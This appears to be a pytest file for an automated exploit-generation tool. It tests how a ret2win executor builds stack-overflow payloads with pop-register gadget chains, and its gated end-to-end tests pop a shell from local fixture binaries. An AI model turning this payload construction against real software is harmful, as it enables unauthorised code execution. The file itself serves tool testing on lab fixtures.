"""W-2 ret2win argument-path rewire (design doc
docs/plans/2026-11-13-w2-required-args-design.md, sections 5.4 and 6 T12/T13).

The seam half is always-run: ``payoff.rank_payoffs`` is patched to return a
crafted report and ``verifier.verify_payload`` is a spy, so every assertion is
about what the executor *delivers* (or refuses to deliver), never about Ghidra.
The end-to-end half is gated by ``SUPWNGO_REQUIRE_GHIDRA=1``: the real extractor,
the real gadget finder and a real overflowable binary, unstripped and stripped
(the stripped run supplies the win address the way ``--win`` does).
"""

from __future__ import annotations

import shutil
import subprocess
import sys
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

from supwngo.analysis import payoff
from supwngo.analysis.payoff import (
    PayoffCandidate,
    PayoffEvidence,
    PayoffReport,
    PayoffStatus,
    RequiredArg,
)
from supwngo.core.binary import PwntoolsLoadState
from supwngo.exploit.pipeline.contracts import AttemptOutcome
from supwngo.exploit.pipeline.executors import stack_techniques as st
from supwngo.exploit.pipeline.executors.stack_techniques import (
    ArgDiscovery,
    Ret2WinExecutor,
)

sys.path.insert(0, str(Path(__file__).parent))
from ghidra_support import need_ghidra  # noqa: E402

WIN_ADDR = 0x401136
WIN_RVA = 0x1136
RET = 0x40101A
POP_RDI = 0x401200
POP_RSI = 0x401202
POP_RDX = 0x401204


def _p(value: int) -> bytes:
    return value.to_bytes(8, "little")


# --------------------------------------------------------------------------- #
# builders


def _ra(position: int, value: int, reg: str) -> RequiredArg:
    return RequiredArg(
        position=position,
        value=value,
        slot=position - 1,
        width_bits=64,
        src_width_bits=64,
        terminal="HighParam",
        reg=reg,
        op="INT_EQUAL",
        op_addr=0x401150,
        sink_addrs=(0x401160,),
        transform=(),
    )


def _cand(rva=WIN_RVA, status="known", reason=None, args=()):
    ev = PayoffEvidence(
        atoms=(),
        sink_api="system",
        target=None,
        rank_key=(),
        score=0,
        required_args=tuple(args),
        args_status=status,
        args_reason=reason,
    )
    return PayoffCandidate(rva=rva, name="win", evidence=ev)


def _report(*cands, status=PayoffStatus.COMPLETE):
    return PayoffReport(
        status=status, candidates=tuple(cands), backend="ghidra", counts={}
    )


def _binary(*, state=PwntoolsLoadState.SUCCESS, base=0x400000, segs=(0x400000,)):
    return SimpleNamespace(
        path=Path("/nonexistent/w2-seam-binary"),
        bits=64,
        base_address=base,
        pwntools_load_state=state,
        segments=[SimpleNamespace(type="PT_LOAD", address=a) for a in segs],
    )


def _context(binary=None, *, offset=88, gadgets=None):
    return SimpleNamespace(
        win_function=("win", WIN_ADDR),
        binary=binary if binary is not None else _binary(),
        offset=offset,
        gadgets=(
            gadgets
            if gadgets is not None
            else {
                "ret": RET,
                "pop_rdi": POP_RDI,
                "pop_rsi": POP_RSI,
                "pop_rdx": POP_RDX,
            }
        ),
    )


class _Spy:
    """A verifier that records every delivery; ``succeed_on`` (a 1-based call
    number, or None for never) picks the call that reports success."""

    def __init__(self, succeed_on=None):
        self.payloads = []
        self.succeed_on = succeed_on

    def verify_payload(self, _technique, payload):
        self.payloads.append(payload)
        ok = self.succeed_on is not None and len(self.payloads) == self.succeed_on
        return SimpleNamespace(success=ok)


class _Legacy:
    """Stands in for ``WinFunctionFinder.find_required_args``."""

    def __init__(self, values=()):
        self.values = list(values)
        self.calls = []

    def __call__(self, binary_path, func_name):
        self.calls.append((binary_path, func_name))
        return list(self.values)


@pytest.fixture
def seam(monkeypatch):
    """Patch the report source and the legacy extractor; no gdb offset search."""
    from supwngo.exploit.offset_finder import WinFunctionFinder

    state = SimpleNamespace(report=_report(), ranked=[], legacy=_Legacy())

    def fake_rank(binary, **kw):
        state.ranked.append(binary)
        return state.report

    monkeypatch.setattr(payoff, "rank_payoffs", fake_rank)
    monkeypatch.setattr(WinFunctionFinder, "find_required_args", state.legacy)
    monkeypatch.setattr(st, "find_offset_via_gdb", lambda *a, **k: None)
    return state


def _run(context, verifier):
    return Ret2WinExecutor().attempt(context, verifier)


# --------------------------------------------------------------------------- #
# ArgDiscovery: the tagged union


def test_arg_discovery_constructors_and_invariants():
    ka = ArgDiscovery.known_args((("rdi", 0x1337),))
    assert ka.kind == ArgDiscovery.KNOWN_ARGS and ka.pairs == (("rdi", 0x1337),)
    assert ArgDiscovery.known_empty().pairs == ()
    for ctor in (ArgDiscovery.unknown, ArgDiscovery.unavailable, ArgDiscovery.rva_miss):
        d = ctor("why")
        assert d.pairs == () and d.reason == "why"
    assert {
        ArgDiscovery.known_empty().kind,
        ArgDiscovery.unknown("x").kind,
        ArgDiscovery.unavailable("x").kind,
        ArgDiscovery.rva_miss("x").kind,
        ka.kind,
    } == {"known_args", "known_empty", "unknown", "unavailable", "rva_miss"}


@pytest.mark.parametrize(
    "kind,pairs",
    [
        ("bogus", ()),
        ("known_args", ()),  # known_args must carry pairs
        ("known_empty", (("rdi", 1),)),  # every other kind must not
        ("unknown", (("rdi", 1),)),
        ("known_args", (("rdi", True),)),  # bool is not an int value
        ("known_args", (("", 1),)),
        ("known_args", ((1, 1),)),
        ("known_args", (("rdi",),)),
    ],
)
def test_arg_discovery_rejects_malformed(kind, pairs):
    with pytest.raises(ValueError):
        ArgDiscovery(kind=kind, pairs=pairs)


# --------------------------------------------------------------------------- #
# _discover_args: report/lookup outcome -> tagged union (design sec 5.4)


def _discover(seam, binary=None):
    ctx = _context(binary)
    return Ret2WinExecutor._discover_args(ctx.binary, "win", WIN_ADDR, ctx)


def test_discover_known_args_maps_each_position_to_its_recorded_register(seam):
    # positions 1 and 3 (non-contiguous), listed out of order on purpose
    seam.report = _report(
        _cand(args=(_ra(3, 0x3333, "rdx"), _ra(1, 0x1111, "rdi")))
    )
    d = _discover(seam)
    assert d.kind == ArgDiscovery.KNOWN_ARGS
    assert d.pairs == (("rdi", 0x1111), ("rdx", 0x3333))
    assert seam.ranked == [str(Path("/nonexistent/w2-seam-binary").resolve())]


def test_discover_mixed_abi_position_two_lands_in_rdi(seam):
    """T13 seam: ``win(double unused, long key)`` -> key is position 2 but lives
    in the FIRST integer register; the value is popped into rdi."""
    seam.report = _report(_cand(args=(_ra(2, 0x4242, "rdi"),)))
    assert _discover(seam).pairs == (("rdi", 0x4242),)


def test_discover_known_empty(seam):
    seam.report = _report(_cand(args=()))
    assert _discover(seam).kind == ArgDiscovery.KNOWN_EMPTY


def test_discover_unknown_when_complete_report_says_unknown(seam):
    seam.report = _report(_cand(status="unknown", reason="unresolved_gate"))
    d = _discover(seam)
    assert d.kind == ArgDiscovery.UNKNOWN
    assert "unresolved_gate" in d.reason


def test_discover_rva_miss_when_win_is_not_a_candidate(seam):
    seam.report = _report(_cand(rva=WIN_RVA + 0x40, args=(_ra(1, 1, "rdi"),)))
    assert _discover(seam).kind == ArgDiscovery.RVA_MISS
    seam.report = _report()  # COMPLETE and empty is still a miss, not "unavailable"
    assert _discover(seam).kind == ArgDiscovery.RVA_MISS


def test_discover_win_below_the_image_base_is_an_rva_miss(seam):
    seam.report = _report(_cand(args=(_ra(1, 1, "rdi"),)))
    b = _binary(base=0x500000, segs=(0x500000,))  # win 0x401136 < base
    assert _discover(seam, b).kind == ArgDiscovery.RVA_MISS


@pytest.mark.parametrize(
    "status",
    [
        PayoffStatus.DEGRADED,
        PayoffStatus.TIMEOUT,
        PayoffStatus.ERROR,
        PayoffStatus.NO_BACKEND,
    ],
)
def test_discover_unavailable_when_report_is_not_complete(seam, status):
    seam.report = _report(_cand(args=(_ra(1, 1, "rdi"),)), status=status)
    assert _discover(seam).kind == ArgDiscovery.UNAVAILABLE


def test_discover_unavailable_when_the_ranker_raises(seam, monkeypatch):
    def boom(*_a, **_k):
        raise RuntimeError("ranker exploded")

    monkeypatch.setattr(payoff, "rank_payoffs", boom)
    d = _discover(seam)
    assert d.kind == ArgDiscovery.UNAVAILABLE and "ranker exploded" in d.reason


# image base acquisition (MAJOR 2): pwntools SUCCESS -> base_address; else the
# lowest PT_LOAD; neither (PE / no segments) -> unavailable, NOT rva_miss.


def test_image_base_from_pwntools_when_the_load_succeeded(seam):
    seam.report = _report(_cand(args=(_ra(1, 7, "rdi"),)))
    # base_address and the segments DISAGREE: only the pwntools value is right.
    b = _binary(state=PwntoolsLoadState.SUCCESS, base=0x400000, segs=(0x100000,))
    assert _discover(seam, b).pairs == (("rdi", 7),)


def test_image_base_from_lowest_pt_load_when_pwntools_did_not_load(seam):
    seam.report = _report(_cand(args=(_ra(1, 7, "rdi"),)))
    # base_address is the default 0 (never populated); the lowest PT_LOAD wins.
    b = _binary(
        state=PwntoolsLoadState.LOAD_FAILED, base=0, segs=(0x400000, 0x401000)
    )
    assert _discover(seam, b).pairs == (("rdi", 7),)


def test_no_acquirable_image_base_is_unavailable_never_rva_miss(seam):
    seam.report = _report(_cand(args=(_ra(1, 7, "rdi"),)))
    pe_like = _binary(state=PwntoolsLoadState.NOT_ATTEMPTED, base=0, segs=())
    d = _discover(seam, pe_like)
    assert d.kind == ArgDiscovery.UNAVAILABLE
    assert seam.ranked == [], "no base means no lookup is possible: do not rank"


# --------------------------------------------------------------------------- #
# delivery routing


def _chain(*pairs):
    return b"".join(_p(g) + _p(v) for g, v in pairs)


def test_known_args_deliver_arg_bearing_payloads_only(seam):
    seam.report = _report(
        _cand(args=(_ra(1, 0x1111, "rdi"), _ra(3, 0x3333, "rdx")))
    )
    spy = _Spy()  # never succeeds: every candidate offset x alignment is tried
    rec = _run(_context(offset=None), spy)

    chain = _chain((POP_RDI, 0x1111), (POP_RDX, 0x3333))
    assert len(spy.payloads) == len(st.COMMON_RET_OFFSETS) * 2
    assert rec.outcome is AttemptOutcome.FAILED
    for payload in spy.payloads:
        assert chain in payload, "a delivery omitted the arg pops"
        assert payload.endswith(chain + _p(WIN_ADDR) + b"\n")
        assert _p(POP_RSI) not in payload, "rsi was never required"
    aligned = [p for p in spy.payloads if _p(RET) in p]
    assert len(aligned) == len(st.COMMON_RET_OFFSETS)
    assert seam.legacy.calls == [], "legacy is only for 'unavailable'"


def test_known_args_exact_payloads_for_a_single_offset(seam):
    seam.report = _report(_cand(args=(_ra(1, 0x1337, "rdi"),)))
    spy = _Spy()
    _run(_context(offset=88), spy)
    chain = _chain((POP_RDI, 0x1337))
    tail = chain + _p(WIN_ADDR) + b"\n"
    assert spy.payloads == [
        b"A" * 88 + _p(RET) + tail,  # aligned, arg-bearing
        b"A" * 88 + tail,  # unaligned, arg-bearing
    ]


def test_no_arg_retry_is_removed_for_known_args(seam):
    seam.report = _report(_cand(args=(_ra(1, 0x1337, "rdi"),)))
    spy = _Spy()
    _run(_context(offset=88), spy)
    bare_win = b"A" * 88 + _p(WIN_ADDR) + b"\n"
    bare_win_aligned = b"A" * 88 + _p(RET) + _p(WIN_ADDR) + b"\n"
    assert bare_win not in spy.payloads and bare_win_aligned not in spy.payloads


def test_known_empty_delivers_arg_free_with_the_same_count(seam):
    seam.report = _report(_cand(args=()))
    spy = _Spy()
    _run(_context(offset=None), spy)
    assert len(spy.payloads) == len(st.COMMON_RET_OFFSETS) * 2
    for payload in spy.payloads:
        assert _p(POP_RDI) not in payload and _p(POP_RDX) not in payload
        assert payload.endswith(_p(WIN_ADDR) + b"\n")
    assert seam.legacy.calls == []


def test_early_exit_on_the_first_verified_delivery(seam):
    seam.report = _report(_cand(args=(_ra(1, 0x1337, "rdi"),)))
    spy = _Spy(succeed_on=1)
    rec = _run(_context(offset=None), spy)
    assert len(spy.payloads) == 1
    assert rec.outcome is AttemptOutcome.SUCCESS
    assert "alignment_ret=yes" in rec.notes[-1]
    assert rec.payload == spy.payloads[0][:-1]


def _assert_abstained(rec, spy, seam):
    assert spy.payloads == [], "an abstain must never reach verify_payload"
    assert rec.outcome is AttemptOutcome.SKIPPED
    assert "required args unresolved" in rec.failure_reason
    assert "--win" in rec.failure_reason
    assert seam.legacy.calls == [], "abstain must not fall back to the legacy scan"


def test_unknown_abstains_before_verify_payload(seam):
    seam.report = _report(_cand(status="unknown", reason="relational_gate"))
    spy = _Spy()
    rec = _run(_context(), spy)
    _assert_abstained(rec, spy, seam)
    assert "relational_gate" in rec.failure_reason


def test_rva_miss_abstains_before_verify_payload(seam):
    seam.report = _report(_cand(rva=WIN_RVA + 8, args=(_ra(1, 1, "rdi"),)))
    spy = _Spy()
    _assert_abstained(_run(_context(), spy), spy, seam)


def test_missing_pop_gadget_abstains_before_verify_payload(seam):
    seam.report = _report(
        _cand(args=(_ra(1, 0x1111, "rdi"), _ra(2, 0x2222, "rsi")))
    )
    gadgets = {"ret": RET, "pop_rdi": POP_RDI}  # no pop rsi
    spy = _Spy()
    rec = _run(_context(gadgets=gadgets), spy)
    _assert_abstained(rec, spy, seam)
    assert "rsi" in rec.failure_reason


@pytest.mark.parametrize("reg", ["rcx", "r8", "r9"])
def test_register_outside_the_builder_set_abstains_not_truncates(seam, reg):
    """A 4th-6th integer arg is correctly EXTRACTED (sec 3 contract) but the
    builder only emits rdi/rsi/rdx: abstain, never a silently shortened chain."""
    seam.report = _report(
        _cand(
            args=(
                _ra(1, 0x1111, "rdi"),
                _ra(4, 0x4444, reg),
            )
        )
    )
    gadgets = {"ret": RET, "pop_rdi": POP_RDI, f"pop_{reg}": 0x401300}
    spy = _Spy()
    rec = _run(_context(gadgets=gadgets), spy)
    _assert_abstained(rec, spy, seam)
    assert reg in rec.failure_reason


def test_non_complete_report_falls_back_to_legacy_normalized_to_pairs(seam):
    seam.report = _report(status=PayoffStatus.TIMEOUT)
    seam.legacy.values = [0x1337, 0x2222]
    spy = _Spy()
    rec = _run(_context(offset=88), spy)
    assert seam.legacy.calls, "unavailable -> the legacy find_required_args"
    legacy_chain = _chain((POP_RDI, 0x1337), (POP_RSI, 0x2222))
    tail = legacy_chain + _p(WIN_ADDR) + b"\n"
    bare = _p(WIN_ADDR) + b"\n"
    # legacy keeps today's behaviour: arg-bearing sweep, then the no-arg retry
    # (its constants are an unproven regex scan and may be false positives).
    assert spy.payloads == [
        b"A" * 88 + _p(RET) + tail,
        b"A" * 88 + tail,
        b"A" * 88 + _p(RET) + bare,
        b"A" * 88 + bare,
    ]
    assert rec.outcome is AttemptOutcome.FAILED


def test_legacy_with_no_constants_delivers_arg_free(seam):
    seam.report = _report(status=PayoffStatus.DEGRADED)
    seam.legacy.values = []
    spy = _Spy()
    _run(_context(offset=88), spy)
    bare = _p(WIN_ADDR) + b"\n"
    assert spy.payloads == [b"A" * 88 + _p(RET) + bare, b"A" * 88 + bare]


def test_no_acquirable_base_also_takes_the_legacy_path(seam):
    pe_like = _binary(state=PwntoolsLoadState.NOT_ATTEMPTED, base=0, segs=())
    seam.legacy.values = [0x1337]
    spy = _Spy()
    _run(_context(pe_like, offset=88), spy)
    assert seam.legacy.calls and seam.ranked == []
    assert len(spy.payloads) == 4  # 2 arg-bearing + 2 no-arg retry


# --------------------------------------------------------------------------- #
# _build_arg_chain: (reg, value) pairs, register from provenance


def test_build_arg_chain_pops_each_value_into_its_recorded_register():
    ctx = _context()
    chain = Ret2WinExecutor._build_arg_chain(
        ctx, (("rdx", 0x3333), ("rdi", 0x1111))
    )
    assert chain == _chain((POP_RDX, 0x3333), (POP_RDI, 0x1111))


def test_build_arg_chain_empty_when_a_gadget_is_absent():
    ctx = _context(gadgets={"ret": RET, "pop_rdi": POP_RDI})
    assert Ret2WinExecutor._build_arg_chain(ctx, (("rsi", 1),)) == b""


def test_build_arg_chain_pads_only_the_pop_rdx_pop_rbx_form():
    gadgets = {"pop rdx; pop rbx": POP_RDX}
    chain = Ret2WinExecutor._build_arg_chain(
        _context(gadgets=gadgets), (("rdx", 0x3333),)
    )
    assert chain == _p(POP_RDX) + _p(0x3333) + _p(0)
    plain = Ret2WinExecutor._build_arg_chain(_context(), (("rdx", 0x3333),))
    assert plain == _p(POP_RDX) + _p(0x3333)  # the plain gadget gets no padding


# --------------------------------------------------------------------------- #
# the legacy extractor is deprecated, not removed


def test_find_required_args_is_deprecated(monkeypatch):
    import subprocess as sp

    from supwngo.exploit.offset_finder import WinFunctionFinder

    monkeypatch.setattr(
        sp, "run", lambda *a, **k: SimpleNamespace(stdout="", returncode=0)
    )
    with pytest.warns(DeprecationWarning, match="required_args_for"):
        assert WinFunctionFinder.find_required_args("/nonexistent", "win") == []


# --------------------------------------------------------------------------- #
# end-to-end (gated): real extractor + real gadget finder + a real overflow


_BUILD = Path(__file__).resolve().parents[1] / "benchmark" / "gen" / "payoff" / "build"


def _fixture(fix_id):
    import json

    idx = json.loads((_BUILD / "index.json").read_text())["entries"]
    entry = next(e for e in idx if e["id"] == fix_id)
    return _BUILD / entry["binary"], json.loads((_BUILD / entry["truth"]).read_text())


class _ShellVerifier:
    """Delivers the payload on a real process's stdin and reports success iff a
    shell came up (the fixture's win() runs ``system("/bin/sh")``)."""

    MARK = b"W2_E2E_SHELL_OK"

    def __init__(self, binary_path):
        self.binary_path = str(binary_path)
        self.payloads = []

    def verify_payload(self, _technique, payload):
        self.payloads.append(payload)
        proc = subprocess.Popen(
            [self.binary_path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        try:
            proc.stdin.write(payload)
            proc.stdin.flush()
            time.sleep(0.4)  # let main's read() return before the shell reads
            proc.stdin.write(b"echo " + self.MARK + b"\nexit\n")
            proc.stdin.flush()
            out, _ = proc.communicate(timeout=10)
        except (OSError, subprocess.TimeoutExpired):
            proc.kill()
            out = proc.communicate()[0] or b""
        return SimpleNamespace(success=self.MARK in out)


def _real_context(binary_path, truth, *, as_stripped):
    from supwngo.core.binary import Binary
    from supwngo.core.context import ExploitContext
    from supwngo.exploit.pipeline.profile_stage import find_gadgets

    binary = Binary(path=Path(binary_path))
    binary.load()
    ctx = ExploitContext(binary=binary)
    # the stripped run names the win function the way ``--win <VADDR>`` does;
    # the unstripped run uses the symbol the pipeline's own search would find.
    name = "operator-supplied" if as_stripped else truth["win_symbol"]
    ctx.win_function = (name, truth["win_vaddr"])
    ctx.offset = truth["ret_offset"]
    find_gadgets(ctx)
    return ctx


@pytest.mark.parametrize("variant", ["unstripped", "stripped"])
@pytest.mark.parametrize("fixture", ["fix-e2e-arg1", "fix-e2e-arg3"])
def test_t12_e2e_win_reached_with_each_param_set(
    fixture, variant, tmp_path, monkeypatch
):
    need_ghidra()
    src, truth = _fixture(fixture)
    target = src
    if variant == "stripped":
        target = tmp_path / (fixture + "-stripped")
        subprocess.run(["strip", "-o", str(target), str(src)], check=True)
    # one throwaway cache DB, so the test never writes the user's cache
    from supwngo.core.database import Database

    db = Database(db_path=str(tmp_path / "cache.db"))
    real_rank = payoff.rank_payoffs
    monkeypatch.setattr(
        payoff, "rank_payoffs", lambda b, **kw: real_rank(b, db=db, **kw)
    )

    ctx = _real_context(target, truth, as_stripped=variant == "stripped")
    for needed in ("pop_rdi", "pop_rsi", "pop_rdx"):
        if len(truth["required_regs"]) >= {"pop_rdi": 1, "pop_rsi": 2, "pop_rdx": 3}[needed]:
            assert needed in ctx.gadgets, (needed, ctx.gadgets)
    verifier = _ShellVerifier(target)
    rec = Ret2WinExecutor().attempt(ctx, verifier)

    assert rec.outcome is AttemptOutcome.SUCCESS, (rec.failure_reason, rec.notes)
    # the win must come from the extractor (known_args), never from the legacy
    # regex fallback a TIMEOUT/DEGRADED report would route to
    assert not any("arg discovery unavailable" in n for n in rec.notes), rec.notes
    # every delivery was arg-bearing: the first one reaches a shell or is the
    # unaligned one preceding it; none omits the pops
    for payload in verifier.payloads:
        for reg, want in zip(truth["required_regs"], truth["required_args"]):
            assert _p(want["value"]) in payload, (reg, want)
    assert shutil.which("strip") is not None
